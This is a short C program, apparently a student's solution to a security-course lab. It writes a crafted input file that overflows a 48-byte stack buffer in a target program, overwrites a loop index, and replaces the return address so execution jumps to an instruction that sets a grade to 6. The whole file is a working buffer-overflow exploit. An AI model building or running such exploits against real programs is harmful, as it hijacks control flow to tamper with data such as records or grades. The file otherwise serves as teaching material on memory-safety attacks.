#include <stdio.h>

/*#define BUFSIZE 48*/

int main()
{
    int i;
    FILE *fp;
    fp = fopen("data6", "w");
    /*Fill the buffer (48 chars) with zeros and add 4 extra zero to reach the variable i*/
    fprintf(fp, "Manos Alexandros"); /*16 chars*/
    fputc('\0', fp);                 /*end of string and to avoid warnings*/

    for (i = 0; i < 35; i++) /*48 + 4 - 17*/
    {
        fputc('0', fp);
    }
    /*change the value of i to 68*/
    /*buf + i = returning address (in stack)*/
    fputc(68, fp);

    /* Change the returning address to the instruction grade = 6*/
    fputc(142, fp);
    fputc(158, fp);
    fputc(4, fp);
    fputc(8, fp);

    fputc(224, fp); /*restore s bss*/
    fputc(66, fp);  /*(char (*)[48]) 0x80e42e0 <Name>*/
    fputc(14, fp);
    fputc(8, fp);

    fclose(fp);
    return 0;
}
